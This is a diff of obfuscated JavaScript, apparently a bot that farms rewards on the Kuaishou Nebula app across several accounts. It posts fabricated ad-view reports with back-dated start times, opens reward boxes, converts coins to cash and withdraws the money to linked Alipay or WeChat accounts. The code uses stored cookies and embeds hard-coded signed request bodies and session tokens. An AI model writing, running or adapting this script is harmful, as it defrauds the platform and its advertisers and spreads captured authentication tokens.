+    let D = 'https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward',
+        j = "activityId=148&client_key=ksgjbody",
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("post", _0x40d1d8);
-    let _0x3b0ef6 = _0x1a0963;
+    await _0x39a23b("post", N);
+    let t = _0x1a0963;
 
-    if (!_0x3b0ef6) {
+    if (!t) {
       return;
     }
 
-    _0x3b0ef6["result"] == 1 ? console["log"]("账号[" + this["name"] + "]逛街获得" + _0x3b0ef6["data"]["amount"] + '金币') : console["log"]("账号[" + this["name"] + "]逛街失败：" + _0x3b0ef6["error_msg"]);
+    t["result"] == 1 ? console["log"]('账号[' + this['name'] + "]逛街获得" + t["data"]["amount"] + '金币') : console["log"]('账号[' + this["name"] + "]逛街失败：" + t["error_msg"]);
   }
 
-  async ["ksAdParam"](_0x2f18c9) {
-    let _0x290b91 = "https://api.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
-        _0x8d4d0a = "encData=WlTuzeTU6mGT9525bjJUVnltdAIDRX9jgjAw%2BtDz1mYL3R7lRHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2Lbcr%2BBQ%2BHac6UUsDrGKYVUfrkQV7RecSLCXPJUZUuMwLsLFCGs%2BKC7eOEJjqWfmVrM8dueIheKRMSZBbt%2FhfvqM%2Fee9NJ%2BJffGvXtHwLJ4qe3oR4kQjVbO0EhDIIWcmQyVb5itptfnW%2F1F34lJHl0CqujrFWFlOcjaQXCE60ckkx6XvzfL5zkj9CNRd2cFx1lwUVFUTsa5DKFhXu4sIKEXboM78io0ZqCYYvkAZZziFfRhqQwVqa5WxJnq9kVQ7%2BB2zTcLXuLQOzAcqTrvBYNYjdEjSQFPNamYXy48vNas%2FQV%2FfltGhC0bmK8%2Fmivdt0oHgO0bRNAuX%2B7KIcCTbikFDv4AKi50SnzMMkBjKDTvHpTgG6KKjeaKVFHA9bYA4PXDQkk4hdcIsJrISYfbX3mP9VqjhO6zZUtvFvCJW7MTpO8qh5olNaHGewl4CO28G0EtjXoGrJlE87qmT9CXdO0MpraCJw7OQHbgHStyrMgbF%2FqtdVTPEGTOIkqit5b3VewlYYbBEsFyQ%2BYoC3PxQ4Lid0l6vN5colVL%2FrVAXXNU0J%2FiCUmwip0N3jluEY5pO%2FBzrkPPDIiEDaEdgrxz9j179pydpnuYcko6MYT6LOPHXg%3D%3D&sign=5a54eecde4d4ea618de6b1e54847dca6fdd0cab94ae896aeb44fc797daabf0e5&cs=false&sig=504669c9a5e6bcc15d9a484cc5d5f57e&client_key=2ac2a76d&__NS_sig3=fced9dbe3a4987fe88b4b7b64022ffd9c544cbcca8a5abbd&os=android&pUid=qQUO36wB-dz_Gy3tLzpbI8UmT77Z5_Ud9c4158be54de319&uQaTag=0&__NStokensig=1bc5fb08cb72593ff961c4aa5f91e578fe09c26159dade76d74fcbd03f56c1ba&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAHfCvyUFfoDIjKLtobHRUI4rV5KX9fmSh5BaFAxbHiD3vrmO7EctytWlWc8tphfjXS5wvVXgD-1C2GqZwimFMlcdjvp5Ioum4yP90I2RAgQnIqRcpeU_cGzwVKlXb0goIUU7hLjiM3AJe13x3GP3V6QxP5YHQAtJYjdbcS1Tgt9PW52UKgZo9xNAv639YVDtvr370HZL90D3uhO5HqUIkGiGhJNk_1UD2hFuJqWEjmUf_4qTIUiIOV_btfbatJr_naJUihUtP_EB3O1dVMiyaa2e0em64z1KAUwAQ",
-        _0x3d44a6 = _0x495d61(_0x290b91, this["cookie"], _0x8d4d0a);
+  async ['ksAdParam'](D) {
+    let j = "https://api.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
+        N = ksjsbAdBody,
+        t = _0x495d61(j, this["cookie"], N);
 
-    await _0x39a23b("post", _0x3d44a6);
-    let _0x375de9 = _0x1a0963;
+    await _0x39a23b("post", t);
+    let p = _0x1a0963;
 
-    if (!_0x375de9) {
+    if (!p) {
       return;
     }
 
-    _0x375de9["result"] == 1 ? _0x375de9["impAdInfo"] && _0x375de9["impAdInfo"]["length"] > 0 && _0x375de9["impAdInfo"][0]["adInfo"] && _0x375de9["impAdInfo"][0]["adInfo"]["length"] > 0 && _0x375de9["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksAdReward"](_0x375de9["llsid"], _0x375de9["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], _0x2f18c9)) : console["log"]("账号[" + this["name"] + "]获取" + _0x2f18c9["name"] + "参数失败：" + _0x375de9["error_msg"]);
+    p['result'] == 1 ? p["impAdInfo"] && p["impAdInfo"]["length"] > 0 && p["impAdInfo"][0]["adInfo"] && p['impAdInfo'][0]["adInfo"]["length"] > 0 && p["impAdInfo"][0]['adInfo'][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksAdReward"](p['llsid'], p['impAdInfo'][0]["adInfo"][0]["adBaseInfo"]["creativeId"], D)) : console["log"]("账号[" + this["name"] + ']获取' + D["name"] + '参数失败：' + p['error_msg']);
   }
 
-  async ["ksAdReward"](_0x1329b6, _0x4e47e2, _0x509425) {
-    let _0x45effd = new Date()["getTime"](),
-        _0x3a5ede = Math["floor"](Math["random"]() * 30000) + 45000,
-        _0x4a5f42 = _0x45effd - _0x3a5ede,
-        _0x117dc7 = "https://api.e.kuaishou.com/rest/r/ad/nebula/reward",
-        _0x4ab77c = "bizStr={\"endTime\":" + _0x45effd + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + _0x4e47e2 + ",\"extInfo\":\"\",\"llsid\":" + _0x1329b6 + ",\"taskType\":1}],\"startTime\":" + _0x4a5f42 + ",\"taskId\":" + _0x509425['id'] + '}',
-        _0x1403fa = _0x495d61(_0x117dc7, this["cookie"], _0x4ab77c);
+  async ['ksAdReward'](D, j, N) {
+    let t = new Date()['getTime'](),
+        p = Math["floor"](Math["random"]() * 30000) + 45000,
+        X = t - p,
+        L = 'https://api.e.kuaishou.com/rest/r/ad/nebula/reward',
+        n = "bizStr={\"endTime\":" + t + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + j + ",\"extInfo\":\"\",\"llsid\":" + D + ",\"taskType\":1}],\"startTime\":" + X + ",\"taskId\":" + N['id'] + '}',
+        z = _0x495d61(L, this["cookie"], n);
 
-    await _0x39a23b("post", _0x1403fa);
-    let _0x5ee7d8 = _0x1a0963;
+    await _0x39a23b('post', z);
+    let A = _0x1a0963;
 
-    if (!_0x5ee7d8) {
+    if (!A) {
       return;
     }
 
-    _0x5ee7d8["result"] == 1 ? console["log"]("账号[" + this["name"] + ']看' + _0x509425["name"] + '获得' + _0x5ee7d8["data"]["awardAmount"] + '金币') : console["log"]("账号[" + this["name"] + ']看' + _0x509425["name"] + "失败：" + _0x5ee7d8["error_msg"]);
+    A["result"] == 1 ? console["log"]("账号[" + this["name"] + ']看' + N["name"] + '获得' + A["data"]['awardAmount'] + '金币') : console["log"]("账号[" + this['name'] + ']看' + N["name"] + '失败：' + A["error_msg"]);
   }
 
-  async ["openBox"](_0xee493a) {
-    let _0x4ac926 = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + _0xee493a + "&isReadyOfAdPlay=true",
-        _0x2ae512 = '',
-        _0x1491b3 = _0x495d61(_0x4ac926, this["cookie"], _0x2ae512);
+  async ["openBox"](D) {
+    let j = "https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen=" + D + "&isReadyOfAdPlay=true",
+        N = '',
+        t = _0x495d61(j, this["cookie"], N);
 
-    await _0x39a23b("get", _0x1491b3);
-    let _0x25c28a = _0x1a0963;
+    await _0x39a23b('get', t);
+    let p = _0x1a0963;
 
-    if (!_0x25c28a) {
+    if (!p) {
       return;
     }
 
-    _0x25c28a["result"] == 1 ? _0xee493a == true ? _0x25c28a["data"]["commonAwardPopup"] && _0x25c28a["data"]["commonAwardPopup"]["awardAmount"] ? (console["log"]("账号[" + this["name"] + "]开宝箱获得" + _0x25c28a["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await _0x3de8b8["wait"](200), await this["ksAdParam"](_0x351e94["box"])) : console["log"]("账号[" + this["name"] + "]开宝箱没有获得金币") : _0x25c28a["data"]["openTime"] > -1 ? (console["log"]("账号[" + this["name"] + "]开宝箱冷却时间还有" + Math["floor"](_0x25c28a["data"]["openTime"] / 1000) + '秒'), _0x25c28a["data"]["openTime"] == 0 && (await _0x3de8b8["wait"](200), await this["openBox"](true))) : console["log"]("账号[" + this["name"] + "]开宝箱次数已用完") : _0xee493a == true ? console["log"]("账号[" + this["name"] + "]开宝箱失败：" + _0x25c28a["error_msg"]) : console["log"]("账号[" + this["name"] + "]查询宝箱状态失败：" + _0x25c28a["error_msg"]);
+    p["result"] == 1 ? D == true ? p["data"]["commonAwardPopup"] && p["data"]['commonAwardPopup']["awardAmount"] ? (console['log']('账号[' + this["name"] + "]开宝箱获得" + p["data"]["commonAwardPopup"]["awardAmount"] + '金币'), await _0x3de8b8["wait"](200), await this['ksAdParam'](_0x351e94["box"])) : console['log']('账号[' + this['name'] + "]开宝箱没有获得金币") : p['data']["openTime"] > -1 ? (console["log"]('账号[' + this["name"] + "]开宝箱冷却时间还有" + Math["floor"](p["data"]["openTime"] / 1000) + '秒'), p["data"]["openTime"] == 0 && (await _0x3de8b8["wait"](200), await this["openBox"](true))) : console["log"]("账号[" + this["name"] + ']开宝箱次数已用完') : D == true ? console["log"]('账号[' + this["name"] + "]开宝箱失败：" + p["error_msg"]) : console["log"]("账号[" + this["name"] + "]查询宝箱状态失败：" + p["error_msg"]);
   }
 
-  async ["withdraw"](_0x15a280) {
+  async ["withdraw"](D) {
     if (!this["bindAlipay"] && !this["bindWechat"]) {
       _0x1ab8b7("账号[" + this["name"] + "]未绑定提现账号，不执行提现");
 
       return;
     }
 
-    let _0x5b2544 = parseInt(_0x15a280 * 100),
-        _0xe71b7f = this["bindAlipay"] ? "ALIPAY" : "WECHAT",
-        _0x3d7336 = _0xe71b7f == "ALIPAY" ? "支付宝" : '微信',
-        _0x3155b9 = _0xe71b7f == "ALIPAY" ? this["alipay"] : this["wechat"],
-        _0x1218fb = "https://www.kuaishoupay.com/pay/account/h5/withdraw/apply",
-        _0x3040d3 = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + _0x5b2544 + "&provider=" + _0xe71b7f + "&total_fen=" + _0x5b2544 + "&commission_fen=0&third_account=" + _0xe71b7f + "&attach=&biz_content=&session_id=",
-        _0x3df5b7 = _0x495d61(_0x1218fb, this["cookie"], _0x3040d3);
+    let j = parseInt(D * 100),
+        N = this["bindAlipay"] ? "ALIPAY" : 'WECHAT',
+        t = N == 'ALIPAY' ? '支付宝' : '微信',
+        p = N == "ALIPAY" ? this["alipay"] : this["wechat"],
+        X = 'https://www.kuaishoupay.com/pay/account/h5/withdraw/apply',
+        L = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + j + "&provider=" + N + '&total_fen=' + j + "&commission_fen=0&third_account=" + N + "&attach=&biz_content=&session_id=",
+        n = _0x495d61(X, this["cookie"], L);
 
-    await _0x39a23b("post", _0x3df5b7);
-    let _0x2fac4c = _0x1a0963;
+    await _0x39a23b("post", n);
+    let z = _0x1a0963;
 
-    if (!_0x2fac4c) {
+    if (!z) {
       return;
     }
 
-    _0x2fac4c["result"] == "SUCCESS" ? _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + _0x15a280 + '元到' + _0x3d7336 + '[' + _0x3155b9 + "]成功") : _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + _0x15a280 + '元到' + _0x3d7336 + '[' + _0x3155b9 + "]失败：" + _0x2fac4c["msg"]);
+    z["result"] == 'SUCCESS' ? _0x1ab8b7('账号' + this['index'] + '[' + this["name"] + "]提现" + D + '元到' + t + '[' + p + "]成功") : _0x1ab8b7('账号' + this['index'] + '[' + this["name"] + ']提现' + D + '元到' + t + '[' + p + "]失败：" + z["msg"]);
   }
 
   async ["withdrawOverview"]() {
-    let _0xca7788 = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021",
-        _0x1bb31b = '',
-        _0x55a5fe = _0x495d61(_0xca7788, this["cookie"], _0x1bb31b);
+    let D = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021",
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x55a5fe);
-    let _0x4f3c27 = _0x1a0963;
+    await _0x39a23b("get", N);
+    let t = _0x1a0963;
 
-    if (!_0x4f3c27) {
+    if (!t) {
       return;
     }
 
-    if (_0x4f3c27["result"] == 1) {
-      if (_0x4f3c27["data"]["isLimit"] == true) {
-        console["log"]("账号[" + this["name"] + "]今天已提现");
+    if (t["result"] == 1) {
+      if (t["data"]['isLimit'] == true) {
+        console["log"]('账号[' + this['name'] + ']今天已提现');
         return;
       }
 
-      let _0x29b355 = parseFloat(this["cashBalance"]);
+      let p = parseFloat(this["cashBalance"]);
 
       if (_0x13d24b == 1) {
-        if (_0x29b355 < 0.3) {
-          _0x1ab8b7("账号[" + this["name"] + "]余额不足0.3元，不提现");
+        if (p < 0.3) {
+          _0x1ab8b7('账号[' + this["name"] + "]余额不足0.3元，不提现");
         } else {
-          let _0x536084 = Math["floor"](_0x29b355 * 10) / 10;
+          let X = Math["floor"](p * 10) / 10;
+          X = X > 50 ? 50 : X;
 
-          _0x536084 = _0x536084 > 50 ? 50 : _0x536084;
-
-          _0x1ab8b7("账号[" + this["name"] + "]准备最大化提现" + _0x536084 + '元');
+          _0x1ab8b7("账号[" + this["name"] + "]准备最大化提现" + X + '元');
 
           await _0x3de8b8["wait"](200);
-          await this["withdraw"](_0x536084);
+          await this["withdraw"](X);
         }
       } else {
         if (!_0x1e627b) {
-          for (let _0x420a4a of _0x4f3c27["data"]["enWithdrawList"]["sort"](function (_0x19cda9, _0xa6635b) {
-            return _0xa6635b - _0x19cda9;
+          for (let L of t["data"]["enWithdrawList"]["sort"](function (n, z) {
+            return z - n;
           })) {
-            if (_0x29b355 >= parseFloat(_0x420a4a)) {
-              _0x1ab8b7("账号[" + this["name"] + "]准备提现" + _0x420a4a + '元');
+            if (p >= parseFloat(L)) {
+              _0x1ab8b7("账号[" + this['name'] + "]准备提现" + L + '元');
 
-              await _0x3de8b8["wait"](200);
-              await this["withdraw"](_0x420a4a);
+              await _0x3de8b8['wait'](200);
+              await this["withdraw"](L);
               return;
             }
           }
 
-          _0x1ab8b7("账号[" + this["name"] + "]余额不足，可提现额度：" + _0x4f3c27["data"]["enWithdrawList"]["join"](','));
+          _0x1ab8b7("账号[" + this["name"] + ']余额不足，可提现额度：' + t["data"]["enWithdrawList"]['join'](','));
         } else {
-          _0x29b355 >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this["name"] + "]准备提现" + _0x1e627b + '元'), await _0x3de8b8["wait"](200), await this["withdraw"](_0x1e627b)) : _0x1ab8b7("账号[" + this["name"] + "]余额不足" + _0x1e627b + "元，不提现");
+          p >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this['name'] + "]准备提现" + _0x1e627b + '元'), await _0x3de8b8["wait"](200), await this["withdraw"](_0x1e627b)) : _0x1ab8b7('账号[' + this['name'] + ']余额不足' + _0x1e627b + '元，不提现');
         }
       }
     } else {
-      console["log"]("账号[" + this["name"] + "]查询提现列表失败：" + _0x4f3c27["error_msg"]);
+      console['log']("账号[" + this["name"] + "]查询提现列表失败：" + t["error_msg"]);
     }
   }
 
   async ["accountOverview"]() {
-    let _0x11ebd9 = "https://nebula.kuaishou.com/rest/n/nebula/account/overview",
-        _0x23c506 = '',
-        _0x3cddb2 = _0x495d61(_0x11ebd9, this["cookie"], _0x23c506);
+    let D = "https://nebula.kuaishou.com/rest/n/nebula/account/overview",
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x3cddb2);
-    let _0x1ed3d6 = _0x1a0963;
+    await _0x39a23b("get", N);
+    let t = _0x1a0963;
 
-    if (!_0x1ed3d6) {
+    if (!t) {
       return;
     }
 
-    if (_0x1ed3d6["result"] == 1) {
-      this["coinBalance"] = _0x1ed3d6["data"]["coinBalance"];
-      this["cashBalance"] = _0x1ed3d6["data"]["cashBalance"];
-      let _0x1f58f1 = _0x1ed3d6["data"]["exchangeCoinState"];
+    if (t["result"] == 1) {
+      this["coinBalance"] = t["data"]["coinBalance"];
+      this["cashBalance"] = t['data']["cashBalance"];
+      let p = t["data"]["exchangeCoinState"];
 
       _0x1ab8b7("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + '金币');
 
-      _0x1f58f1 == 2 && (await _0x3de8b8["wait"](200), await this["changeExchangeType"](0));
+      p == 2 && (await _0x3de8b8["wait"](200), await this["changeExchangeType"](0));
     } else {
-      console["log"]("账号[" + this["name"] + "]查询账户信息失败：" + _0x1ed3d6["error_msg"]);
+      console['log']("账号[" + this['name'] + "]查询账户信息失败：" + t['error_msg']);
     }
   }
 
-  async ["changeExchangeType"](_0x12e125) {
-    let _0x42d584 = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
-        _0x4840a3 = "{\"type\":" + _0x12e125 + '}',
-        _0x4c0418 = _0x495d61(_0x42d584, this["cookie"], _0x4840a3);
+  async ["changeExchangeType"](D) {
+    let j = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType",
+        N = "{\"type\":" + D + '}',
+        t = _0x495d61(j, this['cookie'], N);
 
-    _0x4c0418["headers"]["Content-Type"] = "application/json";
-    await _0x39a23b("post", _0x4c0418);
-    let _0x210c4e = _0x1a0963;
+    t["headers"]['Content-Type'] = 'application/json';
+    await _0x39a23b('post', t);
+    let p = _0x1a0963;
 
-    if (!_0x210c4e) {
+    if (!p) {
       return;
     }
 
-    let _0x35495f = _0x12e125 == 0 ? "自动兑换" : "手动兑换";
-
-    _0x210c4e["result"] == 1 ? console["log"]("账号[" + this["name"] + "]兑换方式更改成功，目前兑换方式为：" + _0x35495f) : console["log"]("账号[" + this["name"] + "]兑换方式更改失败：" + _0x210c4e["error_msg"]);
+    let X = D == 0 ? "自动兑换" : "手动兑换";
+    p["result"] == 1 ? console["log"]('账号[' + this["name"] + "]兑换方式更改成功，目前兑换方式为：" + X) : console['log']("账号[" + this["name"] + ']兑换方式更改失败：' + p["error_msg"]);
   }
 
   async ["exchangeCoin"]() {
     if (this["coinBalance"] < 100) {
-      console["log"]("账号[" + this["name"] + "]金币余额不足100，不执行兑换");
+      console["log"]('账号[' + this["name"] + "]金币余额不足100，不执行兑换");
       return;
     }
 
-    let _0x11e8a7 = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit",
-        _0x45c06d = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
-        _0x35866b = _0x495d61(_0x11e8a7, this["cookie"], _0x45c06d);
+    let D = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit",
+        j = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
+        N = _0x495d61(D, this["cookie"], j);
 
-    _0x35866b["headers"]["Content-Type"] = "application/json";
-    await _0x39a23b("post", _0x35866b);
-    let _0x9b506a = _0x1a0963;
+    N["headers"]["Content-Type"] = "application/json";
+    await _0x39a23b('post', N);
+    let t = _0x1a0963;
 
-    if (!_0x9b506a) {
+    if (!t) {
       return;
     }
 
-    if (_0x9b506a["result"] == 1) {
-      let _0x595467 = Math["floor"](this["coinBalance"] / 100) * 100,
-          _0x2215d2 = Math["floor"](this["coinBalance"] / 100) / 100;
-
-      console["log"]("账号[" + this["name"] + "]兑换金币成功，将" + _0x595467 + "金币兑换成" + _0x2215d2 + '元');
+    if (t["result"] == 1) {
+      let p = Math["floor"](this["coinBalance"] / 100) * 100,
+          X = Math["floor"](this["coinBalance"] / 100) / 100;
+      console['log']("账号[" + this['name'] + "]兑换金币成功，将" + p + "金币兑换成" + X + '元');
     } else {
-      console["log"]("账号[" + this["name"] + "]兑换金币失败：" + _0x9b506a["error_msg"]);
+      console["log"]("账号[" + this['name'] + ']兑换金币失败：' + t['error_msg']);
     }
   }
 
-  async ["ksNeoAdParam"](_0x58630d) {
-    let _0x2bcaf3 = "https://api2.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
-        _0x347db8 = "encData=WlTuzeTU6mGT9525bjJUVnltdAIDRX9jgjAw%2BtDz1mYL3R7lRHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2Lbcr%2BBQ%2BHac6UUsDrGKYVUfrkQV7RecSLCXPJUZUuMwLsLFCGs%2BKC7eOEJjqWfmVrM8dueIheKRMSZBbt%2FhfvqM%2Fee9NJ%2BJffGvXtHwLJ4qe3oR4kQjVbO0EhDIIWcmQyVb5itptfnW%2F1F34lJHl0CqujrFWFlOcjaQXCE60ckkx6XvzfL5zkj9CNRd2cFx1lwUVFUTsa5DKFhXu4sIKEXboM78io0ZqCYYvkAZZziFfRhqQwVqa5WxJnq9kVQ7%2BB2zTcLXuLQOzAcqTrvBYNYjdEjSQFPNamYXy48vNas%2FQV%2FfltGhC0bmK8%2Fmivdt0oHgO0bRNAuX%2B7KIcCTbikFDv4AKi50SnzMMkBjKDTvHpTgG6KKjeaKVFHA9bYA4PXDQkk4hdcIsJrISYfbX3mP9VqjhO6zZUtvFvCJW7MTpO8qh5olNaHGewl4CO28G0EtjXoGrJlE87qmT9CXdO0MpraCJw7OQHbgHStyrMgbF%2FqtdVTPEGTOIkqit5b3VewlYYbBEsFyQ%2BYoC3PxQ4Lid0l6vN5colVL%2FrVAXXNU0J%2FiCUmwip0N3jluEY5pO%2FBzrkPPDIiEDaEdgrxz9j179pydpnuYcko6MYT6LOPHXg%3D%3D&sign=5a54eecde4d4ea618de6b1e54847dca6fdd0cab94ae896aeb44fc797daabf0e5&cs=false&sig=504669c9a5e6bcc15d9a484cc5d5f57e&client_key=2ac2a76d&__NS_sig3=fced9dbe3a4987fe88b4b7b64022ffd9c544cbcca8a5abbd&os=android&pUid=qQUO36wB-dz_Gy3tLzpbI8UmT77Z5_Ud9c4158be54de319&uQaTag=0&__NStokensig=1bc5fb08cb72593ff961c4aa5f91e578fe09c26159dade76d74fcbd03f56c1ba&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAHfCvyUFfoDIjKLtobHRUI4rV5KX9fmSh5BaFAxbHiD3vrmO7EctytWlWc8tphfjXS5wvVXgD-1C2GqZwimFMlcdjvp5Ioum4yP90I2RAgQnIqRcpeU_cGzwVKlXb0goIUU7hLjiM3AJe13x3GP3V6QxP5YHQAtJYjdbcS1Tgt9PW52UKgZo9xNAv639YVDtvr370HZL90D3uhO5HqUIkGiGhJNk_1UD2hFuJqWEjmUf_4qTIUiIOV_btfbatJr_naJUihUtP_EB3O1dVMiyaa2e0em64z1KAUwAQ",
-        _0x5133c4 = _0x495d61(_0x2bcaf3, this["cookie"], _0x347db8);
+  async ["ksNeoAdParam"](D) {
+    let j = "https://api2.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA",
+        N = ksjsbAdBody,
+        t = _0x495d61(j, this["cookie"], N);
 
-    await _0x39a23b("post", _0x5133c4);
-    let _0x45e390 = _0x1a0963;
+    await _0x39a23b("post", t);
+    let p = _0x1a0963;
 
-    if (!_0x45e390) {
+    if (!p) {
       return;
     }
 
-    _0x45e390["result"] == 1 ? _0x45e390["impAdInfo"] && _0x45e390["impAdInfo"]["length"] > 0 && _0x45e390["impAdInfo"][0]["adInfo"] && _0x45e390["impAdInfo"][0]["adInfo"]["length"] > 0 && _0x45e390["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksNeoAdReward"](_0x45e390["llsid"], _0x45e390["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], _0x58630d)) : console["log"]("账号[" + this["name"] + "]获取" + _0x58630d["name"] + "参数失败：" + _0x45e390["error_msg"]);
+    p["result"] == 1 ? p["impAdInfo"] && p["impAdInfo"]["length"] > 0 && p["impAdInfo"][0]["adInfo"] && p["impAdInfo"][0]['adInfo']["length"] > 0 && p["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksNeoAdReward"](p['llsid'], p["impAdInfo"][0]['adInfo'][0]["adBaseInfo"]["creativeId"], D)) : console['log']("账号[" + this["name"] + "]获取" + D["name"] + "参数失败：" + p["error_msg"]);
   }
 
-  async ["ksNeoAdReward"](_0x1656b0, _0x4f9393, _0x1c21e2) {
-    let _0x367ea1 = new Date()["getTime"](),
-        _0x1aac8d = Math["floor"](Math["random"]() * 30000) + 45000,
-        _0x203d12 = _0x367ea1 - _0x1aac8d,
-        _0x52b8e9 = "https://api.e.kuaishou.com/rest/r/ad/task/report",
-        _0x28b824 = "bizStr={\"businessId\":" + _0x1c21e2["businessId"] + ",\"endTime\":" + _0x367ea1 + ",\"extParams\":\"" + _0x1c21e2["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + _0x4f9393 + ",\"extInfo\":\"\",\"llsid\":" + _0x1656b0 + ",\"taskType\":1}],\"pageId\":" + _0x1c21e2["pageId"] + ",\"posId\":" + _0x1c21e2["posId"] + ",\"startTime\":" + _0x203d12 + ",\"subPageId\":" + _0x1c21e2["subPageId"] + '}',
-        _0x75f548 = _0x495d61(_0x52b8e9, this["cookie"], _0x28b824);
+  async ['ksNeoAdReward'](D, j, N) {
+    let t = new Date()["getTime"](),
+        p = Math["floor"](Math["random"]() * 30000) + 45000,
+        X = t - p,
+        L = 'https://api.e.kuaishou.com/rest/r/ad/task/report',
+        n = "bizStr={\"businessId\":" + N["businessId"] + ",\"endTime\":" + t + ",\"extParams\":\"" + N["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + j + ",\"extInfo\":\"\",\"llsid\":" + D + ",\"taskType\":1}],\"pageId\":" + N["pageId"] + ",\"posId\":" + N["posId"] + ",\"startTime\":" + X + ",\"subPageId\":" + N["subPageId"] + '}',
+        z = _0x495d61(L, this['cookie'], n);
 
-    await _0x39a23b("post", _0x75f548);
-    let _0x4960dc = _0x1a0963;
+    await _0x39a23b('post', z);
+    let A = _0x1a0963;
 
-    if (!_0x4960dc) {
+    if (!A) {
       return;
     }
 
-    if (_0x4960dc["result"] == 1) {
-      let _0x46d5ea = _0x4960dc["data"]["neoAmount"] + '金币';
+    if (A["result"] == 1) {
+      let l = A['data']["neoAmount"] + '金币';
 
-      if (_0x4960dc["data"]["neoToH5Data"]) {
+      if (A["data"]['neoToH5Data']) {
         try {
-          let _0x1bda7b = JSON["parse"](_0x331719["decode"](_0x4960dc["data"]["neoToH5Data"])["replace"](/\0/g, ''));
-
-          if (_0x1bda7b["extraCoin"]) {
-            _0x46d5ea += '+' + _0x1bda7b["extraCoin"] + '金币';
-          }
-        } catch (_0x280b22) {
-          console["log"](_0x4960dc["data"]["neoToH5Data"]);
+          let k = JSON['parse'](_0x331719["decode"](A["data"]["neoToH5Data"])["replace"](/\0/g, ''));
+          k['extraCoin'] && (l += '+' + k["extraCoin"] + '金币');
+        } catch (d) {
+          console["log"](A["data"]["neoToH5Data"]);
         } finally {}
       }
 
-      console["log"]("账号[" + this["name"] + ']看' + _0x1c21e2["name"] + '获得' + _0x46d5ea);
-
-      if (this["hasLuckydraw"]) {
-        await this["luckdrawTasks"]();
-      }
+      console["log"]("账号[" + this["name"] + ']看' + N["name"] + '获得' + l);
+      this["hasLuckydraw"] && (await this["luckdrawTasks"]());
     } else {
-      console["log"]("账号[" + this["name"] + ']看' + _0x1c21e2["name"] + "失败：" + _0x4960dc["error_msg"]);
+      console["log"]("账号[" + this["name"] + ']看' + N['name'] + '失败：' + A["error_msg"]);
     }
   }
 
   async ["luckdrawInfo"]() {
-    let _0x114805 = "https://activity.e.kuaishou.com/rest/r/game/user/info",
-        _0x4a96ef = '',
-        _0x1e40b1 = _0x495d61(_0x114805, this["cookie"], _0x4a96ef);
+    let D = 'https://activity.e.kuaishou.com/rest/r/game/user/info',
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x1e40b1);
-    let _0x4d8fbb = _0x1a0963;
+    await _0x39a23b("get", N);
+    let t = _0x1a0963;
 
-    if (!_0x4d8fbb) {
+    if (!t) {
       return;
     }
 
-    if (_0x4d8fbb["result"] == 1) {
